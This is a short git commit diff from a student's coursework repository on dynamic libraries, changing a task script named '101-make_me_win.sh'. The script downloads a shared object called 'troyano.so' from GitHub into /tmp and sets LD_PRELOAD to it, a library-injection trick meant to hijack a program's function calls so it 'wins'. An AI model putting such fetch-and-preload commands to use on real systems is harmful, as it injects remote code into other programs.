52237cdcdb60676c6bcb4e6a0739d2fcf42db67b
DiegoSusviela <dieguitosus@hotmail.com>
2021-05-03 18:39:16 -0300

    idk what else to change

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/troyano.so https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/54110f21d961260bec8ed10402ed62dc10a1d8c4/0x18-dynamic_libraries/troyano.so
+wget -P /tmp https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/54110f21d961260bec8ed10402ed62dc10a1d8c4/0x18-dynamic_libraries/troyano.so
 export LD_PRELOAD=/tmp/troyano.so
